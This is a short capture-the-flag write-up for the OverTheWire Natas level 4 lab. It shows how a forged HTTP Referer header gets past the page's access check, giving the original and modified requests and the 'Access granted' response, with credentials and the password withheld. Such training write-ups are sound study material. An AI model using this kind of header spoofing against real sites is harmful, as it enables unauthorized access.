# Natas4
#natas #http-header #burp-suite
## Vulnerability:
The application trusts the client-controlled HTTP `Referer` header for authorization. 
## Technique:
Used `Burp Suite` to send a custom request, by modifying `Referer` header:
**Original request:**
```http
GET / HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Authorization: Basic <REDACTED>
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas4.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
**Custom request:**
```http
GET / HTTP/1.1
Host: natas4.natas.labs.overthewire.org
Authorization: Basic <REDACTED>
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas5.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
**Result:**
```html
<body>
    <h1>natas4</h1>
        <div id="content">

            Access granted. The password for natas5 is
            <PASSWORD>                             
            <br/>
            <div id="viewsource">
                <a href="index.php">
                      Refresh page
                 </a>
            </div>
        </div>
</body>
```
## Password found:
[Not disclosed — solve it yourself!]
## Previous Level:
[Natas3](./Natas3.md)
## Next Level:
[Natas5](./Natas5.md)
